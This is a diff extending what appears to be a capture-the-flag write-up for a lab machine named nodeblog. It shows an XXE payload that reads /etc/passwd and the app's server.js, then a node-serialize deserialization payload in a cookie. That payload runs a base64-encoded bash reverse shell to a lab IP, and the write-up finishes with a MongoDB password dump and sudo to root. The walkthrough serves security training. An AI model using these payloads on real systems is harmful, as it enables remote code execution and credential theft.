@@ -186,5 +186,165 @@ Uploading that leaks the `/etc/passwd` file
 ![image](https://user-images.githubusercontent.com/113513376/221326390-99f28637-b05f-42f7-ae0d-cded719c698a.png)
 ![image](https://user-images.githubusercontent.com/113513376/221326415-0f26039c-df4c-4dfb-8ee7-f205e931241a.png)
 
-Since we previously leaked the path of the web server and we know that its a nodejs web server, lets read its source code
+Since we previously leaked the path of the web server and we know that its a nodejs web server, lets read the web server source code
+
+After trying various common files like app.js, main.js eventually server.js worked
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ELEMENT title ANY>
+<!ENTITY file SYSTEM "file:///opt/blog/server.js">
+]>
+<article>
+  <title>&file;</title>
+  <description>Lol</description>
+  <markdown>`hehe`</markdown>
+</article>
+```
+
+Uploading it leaks the web app source code
+![image](https://user-images.githubusercontent.com/113513376/221338456-c3b3ac93-a82a-4fab-8648-6b00a7cac1fc.png)
+
+Heres' the updated one
+![image](https://user-images.githubusercontent.com/113513376/221338582-08c61f26-6afc-41c6-9c29-63495dae1321.png)
+![image](https://user-images.githubusercontent.com/113513376/221338588-e7fb5c48-f590-407f-b932-01f6c2b66a43.png)
+
+From this we know that the secret key is `UHC-SecretKey-123` also here's whats interesting
+
+```
+function authenticated(c) {
+    if (typeof c == undefined)
+        return false
+
+    c = serialize.unserialize(c)
+
+    if (c.sign == (crypto.createHash(md5).update(cookie_secret + c.user).digest(hex)) ){
+        return true
+    } else {
+        return false
+    }
+}
+```
+
+We see that while it tries authenticating a user it does serialization on the cookie
+
+That means that we can perform a deserialzation attack 
+
+Searching for NodeJS Deserialzation leads here [Exploit](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
+
+Now from the source script we know that its the cookie thats being serialized 
+
+Decoding the cookie gives this 
+![image](https://user-images.githubusercontent.com/113513376/221339355-f2683eea-ebef-4a55-9ff9-abd03a118a5a.png)
+
+Since we know the format here's the exploit
+
+I'll make a base64 encoded reverse shell
+
+```
+┌──(mark㉿haxor)-[~/Desktop/Tools]
+└─$ echo -n "bash -i >& /dev/tcp/10.10.14.10/1337 0>&1" | base64 
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC8xMzM3IDA+JjE=
+```
+
+Here's the final exploit
+
+```
+{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC8xMzM3IDA+JjE=|base64 -d|bash', function(error, stdout, stderr) { console.log(stdout) });}()"}
+```
+
+I will urlencode it and replace it with the value stored in auth
+![image](https://user-images.githubusercontent.com/113513376/221339490-1bd7a03f-7cb8-4356-b505-7e0e59e87f54.png)
+![image](https://user-images.githubusercontent.com/113513376/221339511-98de8325-0fe2-40d2-b14c-b725b7d4b880.png)
+
+After forwarding the request i get a connection back from our listener
+
+```
+└─$ nc -lvnp 1337       
+listening on [any] 1337 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.11.139] 53202
+bash: cannot set terminal process group (864): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+bash: /home/admin/.bashrc: Permission denied
+admin@nodeblog:/opt/blog$ 
+```
+
+We're user admin but we can't access the directory
+![image](https://user-images.githubusercontent.com/113513376/221339645-ad9b8485-14a8-4fcd-a11a-d9138a06e160.png)
+
+Checking internal ports shows 
+
+```
+admin@nodeblog:/home$ ss -tulnp
+ss -tulnp
+Netid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process                                                                         
+udp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*                                                                                     
+tcp     LISTEN   0        4096           127.0.0.1:27017          0.0.0.0:*                                                                                     
+tcp     LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*                                                                                     
+tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*                                                                                     
+tcp     LISTEN   0        511                    *:5000                 *:*      users:(("node /opt/blog/",pid=864,fd=20))                                      
+tcp     LISTEN   0        128                 [::]:22                [::]:*                                                                                     
+admin@nodeblog:/home$ 
+```
+
+To connect to the mongodb i'll first stabilize my shell
+
+```
+script -c /bin/bash /dev/null 
+CTRL +Z
+stty raw -echo;fg
+```
+
+Now i'll connect to the db 
+![image](https://user-images.githubusercontent.com/113513376/221339940-1956d8e6-76c6-4033-b69c-477c82d7d643.png)
+
+We get the admin password as `IppsecSaysPleaseSubscribe`
+
+Running `sudo -l` shows we can run all as root
+
+```
+admin@nodeblog:/tmp$ sudo -l
+[sudo] password for admin: 
+Matching Defaults entries for admin on nodeblog:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on nodeblog:
+    (ALL) ALL
+    (ALL : ALL) ALL
+admin@nodeblog:/tmp$ 
+```
+
+To get root is as easy as doing `sudo su`
+
+```
+admin@nodeblog:/tmp$ sudo su
+root@nodeblog:/tmp# cd /root
+root@nodeblog:~# ls -al
+total 60
+drwx------ 1 root root   162 Jan  4  2022 .
+drwxr-xr-x 1 root root   180 Dec 27  2021 ..
+-rw------- 1 root root 10687 Jan  4  2022 .bash_history
+-rw-r--r-- 1 root root  3106 Dec  5  2019 .bashrc
+drwxr-xr-x 1 root root    56 Jan  4  2022 .cache
+drwx------ 1 root root    22 Dec 13  2021 .config
+-rw------- 1 root root    39 Dec 31  2021 .lesshst
+drwxr-xr-x 1 root root    90 Dec 13  2021 .npm
+drwxr-xr-x 1 root root   148 Feb 25 03:40 .pm2
+-rw-r--r-- 1 root root   161 Dec  5  2019 .profile
+drwx------ 1 root root    30 Jul  2  2021 .ssh
+-rw------- 1 root root 13633 Jan  4  2022 .viminfo
+-rw-r--r-- 1 root root    33 Feb 25 03:41 root.txt
+drwxr-xr-x 1 root root     6 Jul  2  2021 snap
+root@nodeblog:~#
+```
+
+And we're done
+
+<br> <br>
+[Back To Home](../../index.md)
 
